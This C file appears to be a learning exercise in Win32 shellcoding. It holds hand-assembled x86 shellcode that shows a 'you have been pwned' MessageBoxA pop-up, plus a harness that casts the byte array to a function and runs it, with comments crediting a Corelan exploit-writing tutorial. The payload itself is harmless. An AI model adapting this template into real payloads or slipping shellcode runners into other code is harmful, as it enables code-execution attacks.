#include <stdio.h>
#include <string.h>

char code[] =

// Simple MessageBoxA() win32 shellcode, with NULL bytes
// Tutorial: https://www.corelan.be/index.php/2010/02/25/exploit-writing-tutorial-part-9-introduction-to-win32-shellcoding/
// Author: w4fz5uck5
// Generator used: mona.py -> Immunity Debbuger plugin
// Immunity Command e.g: !mona assemble -s "push ebx"

// --------------SHELLCODE MAIN IDEA--------------
//
// PUSH w4fz5uck5
// MOV ebx, esp
// PUSH  "You have been pwned by w4fz5uck5"
// MOV ecx, esp
// XOR eax,eax 
// PUSH eax
// PUSH ebx
// PUSH ecx
// PUSH eax
// PUSH eax
// MOV esi, USER32.dll (MessageBoxA())
// JMP esi
// CALL SEH (Structured Exception Handler)
//-------------------------------------------------

"\x68\x35\x20\x20\x00"    //PUSH 0x00202035
"\x68\x35\x75\x63\x6b"    //PUSH 0x6b637535
"\x68\x77\x34\x66\x7a"    //PUSH 0x7a663477
"\x8b\xdc"                //MOV ebx, esp 
"\x68\x20\x20\x20\x00"    //PUSH 0x00202020
"\x68\x75\x63\x6b\x35"    //PUSH 0x356b6375
"\x68\x34\x66\x7a\x35"    //PUSH 0x357a6634
"\x68\x62\x79\x20\x77"    //PUSH 0x77207962
"\x68\x6e\x65\x64\x20"    //PUSH 0x2064656e
"\x68\x6e\x20\x70\x77"    //PUSH 0x7770206e
"\x68\x20\x62\x65\x65"    //PUSH 0x65656220
"\x68\x68\x61\x76\x65"    //PUSH 0x65766168
"\x68\x59\x6f\x75\x20"    //PUSH 0x20756f59
"\x8b\xcc"				  //MOV ecx, esp
"\x33\xc0"				  //XOR eax,eax
"\x50"					  //PUSH eax		
"\x53"				      //PUSH ebx
"\x51"					  //PUSH ecx
"\x50"					  //PUSH eax		
"\x50"					  //PUSH eax		
"\xc7\xc6\xea\x07\x45\x7e"//MOV esi, 0x7e4507ea(USER32.dll -> MessageBoxA())
"\xff\xe6"				  //JMP esi	
"\x33\xc0"				  //XOR eax,eax
"\xff\xd0";				  //CALL eax

int main(int argc, char **argv)
{

 	printf("Shellcode Length: %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();	
}
